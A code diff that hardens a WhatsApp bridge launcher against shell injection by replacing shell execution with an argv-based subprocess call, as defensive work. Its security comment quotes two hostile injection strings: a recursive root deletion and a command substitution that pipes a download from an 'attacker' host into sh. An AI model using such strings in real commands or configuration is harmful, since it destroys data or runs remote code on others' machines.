@@ -165,9 +165,25 @@ class WhatsAppChannel(BaseChannel):
         for key, value in (self.config.bridge_env or {}).items():
             env[str(key)] = str(value)
 
+        # SECURITY (Sanmarcsoft post-merge channel RedTeam, CH-MEDIUM-D):
+        # Upstream used create_subprocess_shell(command) with shell=True
+        # semantics. A bridge_command containing shell metacharacters
+        # (`; rm -rf /`, `$(curl attacker | sh)`) would be interpreted by
+        # the shell. Switched to create_subprocess_exec with shlex.split
+        # — bridge_command must be a real argv. Operators wanting shell
+        # features should write a wrapper script.
+        import shlex
         try:
-            self._bridge_process = await asyncio.create_subprocess_shell(
-                command,
+            command_argv = shlex.split(command)
+        except ValueError as exc:
+            logger.warning("WhatsApp bridge_command split failed: %s", exc)
+            return
+        if not command_argv:
+            logger.warning("WhatsApp bridge_command resolved to empty argv")
+            return
+        try:
+            self._bridge_process = await asyncio.create_subprocess_exec(
+                *command_argv,
                 cwd=workdir,
                 env=env,
             )
